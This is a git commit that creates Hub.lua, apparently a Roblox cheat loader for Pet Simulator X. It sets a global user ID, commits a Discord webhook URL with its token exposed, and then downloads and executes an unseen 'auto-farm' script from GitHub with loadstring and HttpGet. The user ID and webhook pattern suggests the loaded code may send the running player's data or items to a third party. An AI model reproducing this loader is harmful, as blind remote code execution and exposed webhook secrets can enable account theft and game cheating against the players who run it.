bac0add73ebb577a0b2c23009bf4210f0d28eb18
Psx-Script <120688763+Psx-Script@users.noreply.github.com>
2022-12-24 14:51:08 +0300

    Create Hub.lua

---
+++ Hub.lua
@@ -0,0 +1,3 @@
+_G.UserID = 1803819784
+_G.WebHook = "https://discord.com/api/webhooks/1056175724337299456/NhpIbWHhNHo2W7Vi2DYkDCT1aQe9FSWBNVx-Ow9dsZ_QklWFZwRYmwESMdOgFvhCPm-m"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
